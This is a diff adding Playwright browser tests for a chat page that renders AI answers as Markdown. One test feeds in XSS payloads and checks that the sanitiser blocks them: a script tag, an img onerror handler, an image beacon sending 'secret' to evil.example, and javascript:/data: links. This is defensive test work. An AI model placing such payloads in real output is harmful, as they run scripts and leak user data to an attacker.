@@ -1,4 +1,4 @@
-import { expect, test } from "@playwright/test";
+import { expect, test, type Page } from "@playwright/test";
 import React from "react";
 import { renderToStaticMarkup } from "react-dom/server";
 
@@ -100,5 +100,77 @@ test.describe("Markdown renderer (node-only)", () => {
     expect(safeUrl("/records")).toBe("/records");
     expect(safeUrl("#x")).toBe("#x");
     expect(safeUrl("mailto:a@example.com")).toBe("mailto:a@example.com");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Browser: the chat page renders answers through Markdown (D-10).
+// ---------------------------------------------------------------------------
+const RUN = "00000000-0000-4000-8000-0000000000a1";
+const sse = (...events: unknown[]) =>
+  events.map((e) => `data: ${typeof e === "string" ? e : JSON.stringify(e)}\n\n`).join("");
+const runEvt = { type: "run", run_id: RUN };
+const input = (page: Page) => page.getByLabel("Ask monai a question");
+
+async function askWithText(page: Page, text: string) {
+  await page.route(/\/api\/threads$/, (route) => route.fulfill({ json: [] }));
+  await page.route(/\/api\/query-stream$/, (route) =>
+    route.fulfill({
+      status: 200,
+      contentType: "text/event-stream",
+      body: sse(runEvt, { type: "answer", text, proposals: [], trace: [] }, "[DONE]"),
+    }),
+  );
+  await page.goto("/chat");
+  await input(page).fill("Synthetic question?");
+  await input(page).press("Enter");
+  await expect(page.locator('[data-testid="answer"]')).toBeVisible();
+}
+
+test.describe("Markdown in the chat page (browser)", () => {
+  test("hostile markdown makes no beacon request and runs no script", async ({ page }) => {
+    const requests: string[] = [];
+    page.on("request", (r) => requests.push(r.url()));
+    await askWithText(
+      page,
+      [
+        "<script>window.__pwned=1</script>",
+        '<img src=x onerror="window.__pwned=1">',
+        "![x](https://evil.example/beacon?d=secret)",
+        "[js](javascript:window.__pwned=1) [data](data:text/html,hi)",
+        "[ok](https://example.com)",
+      ].join("\n\n"),
+    );
+    // let any (forbidden) image request fire before asserting its absence
+    await page.waitForLoadState("networkidle");
+    expect(requests.filter((u) => u.includes("evil.example"))).toEqual([]);
+    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
+    const answer = page.locator('[data-testid="answer"]');
+    await expect(answer.locator("img")).toHaveCount(0);
+    await expect(answer.locator("script")).toHaveCount(0);
+    const hrefs = await answer
+      .locator("a")
+      .evaluateAll((as) => as.map((a) => [a.getAttribute("href"), a.getAttribute("target"), a.getAttribute("rel")]));
+    expect(hrefs).toEqual([["https://example.com", "_blank", "noopener noreferrer"]]);
+  });
+
+  test("a GFM table renders tabular and right-aligned inside a scrolling region", async ({ page }) => {
+    await askWithText(
+      page,
+      [
+        "| Category | Amount |",
+        "| --- | --- |",
+        "| Food | Rp 1,250,000 |",
+        "| Transport | Rp 300,000 |",
+      ].join("\n"),
+    );
+    const answer = page.locator('[data-testid="answer"]');
+    const css = (sel: string, prop: string) =>
+      answer.locator(sel).evaluateAll((els, p) => els.map((e) => getComputedStyle(e).getPropertyValue(p)), prop);
+    expect(await answer.getByRole("region", { name: "Table" }).evaluate((e) => getComputedStyle(e).overflowX)).toBe("auto");
+    for (const v of await css("th, td", "font-variant-numeric")) expect(v).toContain("tabular-nums");
+    // th: [Category, Amount]; td: [Food, 1,250,000, Transport, 300,000]
+    expect(await css("th", "text-align")).toEqual(["left", "right"]);
+    expect(await css("td", "text-align")).toEqual(["left", "right", "left", "right"]);
   });
 });
